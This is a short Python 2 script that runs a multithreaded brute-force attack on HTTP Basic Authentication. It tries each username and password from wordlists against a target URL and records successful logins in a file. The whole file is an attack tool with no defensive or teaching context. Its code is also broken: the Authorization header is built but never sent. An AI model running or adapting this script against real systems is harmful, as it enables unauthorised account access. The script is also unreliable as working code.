#coding=utf-8
import urllib2
import sys
import re
import base64
from urlparse import urlparse 
import threading
import Queue
from time import sleep
host = 'your url' 
usernameList = open('username.txt','r').read().splitlines()
passwordList = open('password.txt','r').read().splitlines()
f = open('writepass.txt','w')
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
 
	def run(self) :
		while True :
			username = None 
 
			try :
				username = self.queue.get(timeout=1)
			except 	Queue.Empty :
				return
			try :
				for password in passwordList:
					req = urllib2.Request(host)
					base64string = base64.encodestring('%s:%s' % (username, password))[:-1]
					authheader =  "Basic %s" % base64string
					try:
						response = urllib2.urlopen(req, timeout=4)
						print 'got the username and password!\n'
						print "[+] Successful Login! Username: " + username + " Password: " + password
						f.write(username + ',' + password)
					except IOError, e:
						print "wrong username or password!\n"
						print 'the error code is:%d\n' % e.code
						sleep(1)

			except :
				print "can't brute password!\n"
 
			self.queue.task_done()
queue = Queue.Queue()
 
threads = []
for i in range(1, 40) : 
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
 
for username in usernameList :
	queue.put(username)     
 
queue.join()
 

 
for item in threads :
	item.join()
 
print "Testing Complete!"


 
